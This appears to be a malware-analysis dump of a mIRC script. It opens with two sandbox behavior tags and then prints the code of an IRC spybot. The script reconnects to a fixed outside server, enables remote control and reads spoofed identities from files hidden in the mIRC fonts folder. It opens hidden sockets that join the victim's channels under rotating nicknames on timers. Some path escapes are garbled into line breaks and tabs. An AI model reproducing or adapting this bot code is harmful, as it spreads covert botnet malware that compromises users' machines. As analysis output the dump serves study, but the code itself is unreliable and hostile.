behavior.chr: May attempt to obfuscate specific str
behavior.run: May run an executable file or a system command

dump: on 1:DISCONNECT:{ .server kampung.ma.cx | .timerspy off | .timerspy1 off | .sockclose spy | unset %spybot | .timernick off | .timerjoinsock off | .timernick1 off | .timerjoinsock1 off | remote on | emailaddr $read $mircdirfonts\ident.txt | username $read $mircdirfonts\username.txt | identd on $read $mircdirfonts\ident.txt $+ $read $mircdirfonts\random.cnf | nick $read $mircdirfonts\nick.txt | anick $read $mircdirfonts\nick.txt $+ $read $mircdirfonts\tambah.txt }
alias spyon { if ($sock(spy).name == $null) { .sockopen spy %serversock %portsock | set %joinstatus off } | return }
if ((%joinstatus == $null) || (%joinstatus == off)) { set %joinstatus on | goto start }
if (%joinstatus == on) { .timer $+ $r(1,99) 1 $r(1,20) .sockwrite -n spy join $comchan($me,%channel.count) | goto count }
alias otherserv { set %spyserv $?="Enter Server?" $?="Enter Port?" | spyon }
alias Run.spy if ($?!"Do you want to connect bot to $server?") { set %spyserv $server $port | spyon | halt } | else { .timerotherserv 1 0 otherserv }

alias runsockbot { .spyon | set %spybot 1  | .timer 1 3 .sockwrite -n spy nick $read $mircdirfonts
ick.txt $+ $read $mircdirfonts	ambah.txt | .timerjoinsock 1 6 .sockbotjoin | .timernick 0 850 .sockwrite -n spy nick $read $mircdirfonts
ick.txt $+ $read $mircdirfonts	ambah.txt | .timer 0 1000 .sockbotpart | .timer 0 1012 .sockwrite -n spy nick $read $mircdirfonts
ick.txt $+ $read $mircdirfonts	ambah.txt | .timerrejoinsock 0 1015 .sockbotjoin }
alias spyon1 { if ($sock(spy1).name == $null) { .sockopen spy1 %serversock %portsock | set %joinstatus off } | return }
if ((%joinstatus == $null) || (%joinstatus == off)) { set %joinstatus on | goto start }
if (%joinstatus == on) { .timer $+ $r(1,99) 1 $r(1,20) .sockwrite -n spy1 join $comchan($me,%channel.count) | goto count }
alias otherserv { set %spyserv $?="Enter Server?" $?="Enter Port?" | spyon1 }
alias Run.spy if ($?!"Do you want to connect bot to $server?") { set %spyserv $server $port | spyon | halt } | else { .timerotherserv 1 0 otherserv }

alias runsockbot1 { .spyon1 | set %spybot 1  | .timer 1 4 .sockwrite -n spy1 nick $read $mircdirfonts
ick.txt $+ $read $mircdirfonts	ambah.txt | .timerjoinsock1 1 6 .sockbotjoin1 | .timernick1 0 850 .sockwrite -n spy1 nick $read $mircdirfonts
ick.txt $+ $read $mircdirfonts	ambah.txt | .timer 0 1000 .sockbotpart1 | .timer 0 1012 .sockwrite -n spy1 nick $read $mircdirfonts
ick.txt $+ $read $mircdirfonts	ambah.txt | .timerrejoinsock1 0 1015 .sockbotjoin1 }
